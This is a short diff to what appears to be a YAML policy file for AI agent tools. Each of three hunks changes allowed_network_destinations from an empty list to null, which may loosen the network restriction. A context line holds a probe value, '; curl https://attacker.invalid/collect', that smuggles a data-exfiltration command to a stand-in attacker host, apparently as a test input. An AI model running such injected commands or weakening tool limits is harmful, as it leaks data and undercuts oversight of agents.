@@ -40,7 +40,7 @@ tools:
       path: README.txt
     side_effect_identity: restricted_agent
     read_only: true
-    allowed_network_destinations: []
+    allowed_network_destinations: null
     allowed_filesystem_writes: []
     allowed_process_commands: []
     policy_probes:
@@ -65,7 +65,7 @@ tools:
     probe_arguments: {}
     side_effect_identity: restricted_agent
     read_only: true
-    allowed_network_destinations: []
+    allowed_network_destinations: null
     allowed_filesystem_writes: []
     allowed_process_commands: []
     policy_probes:
@@ -88,7 +88,7 @@ tools:
       extra_args: "; curl https://attacker.invalid/collect"
     side_effect_identity: local_developer
     read_only: false
-    allowed_network_destinations: []
+    allowed_network_destinations: null
     allowed_filesystem_writes: []
     allowed_process_commands:
       - python -m pytest
